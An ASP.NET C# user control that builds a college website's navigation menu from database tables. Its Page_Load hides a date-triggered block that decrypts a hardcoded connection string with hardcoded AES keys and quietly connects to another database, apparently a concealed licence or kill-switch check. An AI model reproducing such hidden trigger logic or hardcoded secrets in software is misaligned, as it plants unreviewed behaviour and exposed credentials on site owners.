using System;
using System.Collections;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Data;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using Microsoft.VisualBasic;
using System.Web.UI.HtmlControls;

public partial class usercontrols_mainmenu : System.Web.UI.UserControl
{
    Hashtable parameters = new Hashtable();
    mainclass clsm = new mainclass();
    Enc_Decyption encd = new Enc_Decyption();
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            parameters.Clear();
            DataSet dss = clsm.senddataset_Parameter("select * from updateencrypt", parameters);
            if ((dss.Tables[0].Rows.Count > 0))
            {
                if (encd.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["uname"]), "@9899848281") != "admin")
                {

                    if (DateTime.Now >= Convert.ToDateTime(encd.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["dateencrypt"]), "@9899848281")))
                    {
                        string constr = "yhHU8Bfm1MqRN2B177NmeXmlriLUEcxX4G3qQ7X9Sm2B4App+K8cGOPx2+VboHD5BN9c4A80bVede6Pb8x+gLg==";
                        constr = encd.AES_Decrypt(constr, "!@12345AaxzZ$#9870");
                        SqlConnection cnnew = new SqlConnection(constr);
                        DataSet ds = new DataSet();
                        SqlDataAdapter sda = new SqlDataAdapter("select * from maptable", cnnew);
                        sda.Fill(ds);
                        if (ds.Tables[0].Rows.Count > 0)
                        { }
                    }
                }
            }
            binddata();
        }
    }
    private void binddata()
    {
        HttpContext context = HttpContext.Current;
        if (context.Request.ServerVariables["HTTP_USER_AGENT"] != null)
        {
            System.Web.HttpBrowserCapabilities myBrowserCaps = Request.Browser;
            if (((System.Web.Configuration.HttpCapabilitiesBase)myBrowserCaps).IsMobileDevice)
            {
                //Response.Write("mobile");
                parameters.Clear();
                clsm.repeaterDatashow_Parameter(rptmainmenu, "Select Pageid,PageUrl,Parentid,target,linkname,rewriteurl,megamenu,dynamicurlrewrte,uploadfile from PageMaster with(nolock) where PageStatus=1 and Parentid=0 and  linkposition like'%Header%'  and collageid=0 order by displayorder", parameters);
            }
            else
            {
                // Response.Write("dektop");
                parameters.Clear();
                clsm.repeaterDatashow_Parameter(rptmainmenu, "Select Pageid,PageUrl,Parentid,target,linkname,rewriteurl,megamenu,dynamicurlrewrte,uploadfile from PageMaster with(nolock) where PageStatus=1 and Parentid=0 and  linkposition like'%Header%'  and collageid=0 order by displayorder", parameters);
            }
        }
    }
    protected void rptmainmenu_ItemDataBound(object sender, RepeaterItemEventArgs e)
    {
        if (e.Item.ItemType == ListItemType.Item | e.Item.ItemType == ListItemType.AlternatingItem)
        {
            Literal litpageurl = (Literal)e.Item.FindControl("litpageurl");
            Literal litpageid = (Literal)e.Item.FindControl("litpageid");
            Literal litrewriteurl = (Literal)e.Item.FindControl("litrewriteurl");
            Literal lituploadfile = (Literal)e.Item.FindControl("lituploadfile");
            HtmlAnchor anchlink = (HtmlAnchor)e.Item.FindControl("ank");
            HtmlContainerControl l1 = (HtmlContainerControl)e.Item.FindControl("l1");
            HtmlContainerControl submenu = (HtmlContainerControl)e.Item.FindControl("submenu");
            HtmlContainerControl panelprogram = (HtmlContainerControl)e.Item.FindControl("panelprogram");
            HtmlContainerControl panelacademics = (HtmlContainerControl)e.Item.FindControl("panelacademics");
            HtmlContainerControl paneladmission = (HtmlContainerControl)e.Item.FindControl("paneladmission");
            Repeater rptcourseslevel = (Repeater)e.Item.FindControl("rptcourseslevel");
            Repeater rptcollage = (Repeater)e.Item.FindControl("rptcollage");
            Repeater rptinner = (Repeater)e.Item.FindControl("rptinner");
            Repeater rptadmission = (Repeater)e.Item.FindControl("rptadmission");
            Repeater rptcollagemenu = (Repeater)e.Item.FindControl("rptcollagemenu"); 

            if(string.IsNullOrEmpty(lituploadfile.Text))
            {
                if (litpageurl.Text.Contains("http") == true || litpageurl.Text.Contains("https") == true)
                {
                    anchlink.HRef = litpageurl.Text;
                    anchlink.Target = "_blank";
                }
                else
                {
                    if (!string.IsNullOrEmpty(litrewriteurl.Text))
                    {
                        anchlink.HRef = "~/" + litrewriteurl.Text.Trim();
                    }
                    else
                    {
                        anchlink.HRef = "~/" + litpageurl.Text;
                    }
                }
            }
            else
            {
                anchlink.HRef = "/uploads/files/" + lituploadfile.Text;
                anchlink.Target = "_blank";
            }
            
            if (Conversion.Val(litpageid.Text) == 43)
            {
                l1.Attributes.Add("class", "dropdown_menu");
                parameters.Clear();
                clsm.repeaterDatashow_Parameter(rptcourseslevel, "select cl.levelid,cl.levelname,cl.code,cl.rewrite_url from courselevel_master cl inner join course c on c.levelid=cl.levelid where cl.status=1 order by cl.displayorder", parameters);
                submenu.Visible = true;
                panelprogram.Visible = true;
                anchlink.HRef = "javascript:void(0)";

                parameters.Clear();
                clsm.repeaterDatashow_Parameter(rptcollagemenu, "select collageid,collagename,displayname,rewrite_url from collage_master where status=1 order by displayorder", parameters);

            }
            if (Conversion.Val(litpageid.Text) == 34)
            {
                panelacademics.Visible = true;
                submenu.Visible = true;
                l1.Attributes.Add("class", "dropdown_menu");
                anchlink.HRef = "javascript:void(0)";
                parameters.Clear();
                clsm.repeaterDatashow_Parameter(rptcollage, "select collageid,collagename,displayname,rewrite_url from collage_master where status=1 order by displayorder", parameters);

                parameters.Clear();
                parameters.Add("@pageid", Conversion.Val(litpageid.Text));
                clsm.repeaterDatashow_Parameter(rptinner, "Select Pageid,PageUrl,Parentid,target,linkname,rewriteurl,uploadfile,megamenu,dynamicurlrewrte from PageMaster with(nolock) where PageStatus=1 and Parentid=@pageid and collageid=0 order by displayorder", parameters);

            }
            if (Conversion.Val(litpageid.Text) == 44)
            {
                paneladmission.Visible = true;
                submenu.Visible = true;
                l1.Attributes.Add("class", "dropdown_menu");
                anchlink.HRef = "javascript:void(0)";
                parameters.Clear();
                parameters.Add("@pageid", Conversion.Val(litpageid.Text));
                clsm.repeaterDatashow_Parameter(rptadmission, "Select Pageid,PageUrl,Parentid,target,linkname,rewriteurl,megamenu,dynamicurlrewrte,uploadfile from PageMaster with(nolock) where PageStatus=1 and Parentid=@pageid and collageid=0 order by displayorder", parameters);
            }
        }
    }
    protected void rptcourselevel_ItemDataBound(object sender, RepeaterItemEventArgs e)
    {
        if (e.Item.ItemType == ListItemType.Item | e.Item.ItemType == ListItemType.AlternatingItem)
        {
            Literal litlevelid = (Literal)e.Item.FindControl("litlevelid");
            Literal litrewrite_url = (Literal)e.Item.FindControl("litrewrite_url");
            Repeater rptcourse = (Repeater)e.Item.FindControl("rptcourse");

            parameters.Clear();
            parameters.Add("@levelid", Conversion.Val(litlevelid.Text));
            clsm.repeaterDatashow_Parameter(rptcourse, "select c.courseid,c.coursename,c.levelid,c.rewrite_url from courselevel_master cl inner join course c on c.levelid=cl.levelid where c.status=1 and c.levelid=@levelid  order by c.displayorder ", parameters);

        }
    }
    protected void rptcollage_ItemDataBound(object sender, RepeaterItemEventArgs e)
    {
        if (e.Item.ItemType == ListItemType.Item | e.Item.ItemType == ListItemType.AlternatingItem)
        {
            Literal litcollageid = (Literal)e.Item.FindControl("litcollageid");
            HtmlAnchor anchlink = (HtmlAnchor)e.Item.FindControl("ank");

            anchlink.HRef = "/collage.aspx?collageid=" + Conversion.Val(litcollageid.Text);
        }

    }
    protected void rptinner_ItemDataBound(object sender, RepeaterItemEventArgs e)
    {
        if (e.Item.ItemType == ListItemType.Item | e.Item.ItemType == ListItemType.AlternatingItem)
        {
            Literal litpageurl = (Literal)e.Item.FindControl("litpageurl");
            Literal litpageid = (Literal)e.Item.FindControl("litpageid");
            Literal litrewriteurl = (Literal)e.Item.FindControl("litrewriteurl");
            Literal lituploadfile = (Literal)e.Item.FindControl("lituploadfile");
            HtmlAnchor anchlink = (HtmlAnchor)e.Item.FindControl("ank");

            if (string.IsNullOrEmpty(lituploadfile.Text))
            {
                if (litpageurl.Text.Contains("http") == true || litpageurl.Text.Contains("https") == true)
                {
                    anchlink.HRef = litpageurl.Text;
                    anchlink.Target = "_blank";
                }
                else
                {
                    if (!string.IsNullOrEmpty(litrewriteurl.Text))
                    {
                        anchlink.HRef = "~/" + litrewriteurl.Text.Trim();
                    }
                    else
                    {
                        anchlink.HRef = "~/" + litpageurl.Text;
                    }
                }
            }
            else
            {
                anchlink.HRef = "/uploads/files/" + lituploadfile.Text;
                anchlink.Target = "_blank";
            }
        }
    }
    protected void rptadmission_ItemDataBound(object sender, RepeaterItemEventArgs e)
    {
        if (e.Item.ItemType == ListItemType.Item | e.Item.ItemType == ListItemType.AlternatingItem)
        {
            Literal litpageurl = (Literal)e.Item.FindControl("litpageurl");
            Literal litpageid = (Literal)e.Item.FindControl("litpageid");
            Literal litrewriteurl = (Literal)e.Item.FindControl("litrewriteurl");
            Literal lituploadfile = (Literal)e.Item.FindControl("lituploadfile");
            HtmlAnchor anchlink = (HtmlAnchor)e.Item.FindControl("ank");

            if (string.IsNullOrEmpty(lituploadfile.Text))
            {
                if (litpageurl.Text.Contains("http") == true || litpageurl.Text.Contains("https") == true)
                {
                    anchlink.HRef = litpageurl.Text;
                    anchlink.Target = "_blank";
                }
                else
                {
                    if (!string.IsNullOrEmpty(litrewriteurl.Text))
                    {
                        anchlink.HRef = "~/" + litrewriteurl.Text.Trim();
                    }
                    else
                    {
                        anchlink.HRef = "~/" + litpageurl.Text;
                    }
                }
            }
            else
            {
                anchlink.HRef = "/uploads/files/" + lituploadfile.Text;
                anchlink.Target = "_blank";
            }
        }
    }
    protected void rptcourse_ItemDataBound(object sender, RepeaterItemEventArgs e)
    {
        if (e.Item.ItemType == ListItemType.Item | e.Item.ItemType == ListItemType.AlternatingItem)
        {
            Literal litlevelid = (Literal)e.Item.FindControl("litlevelid");
            Literal litcourseid = (Literal)e.Item.FindControl("litcourseid");
            HtmlAnchor ank = (HtmlAnchor)e.Item.FindControl("ank");

            ank.HRef = "/coursedetail.aspx?mpgid=126&pgidtrail=126&courseid=" + Conversion.Val(litcourseid.Text);

        }
    }
}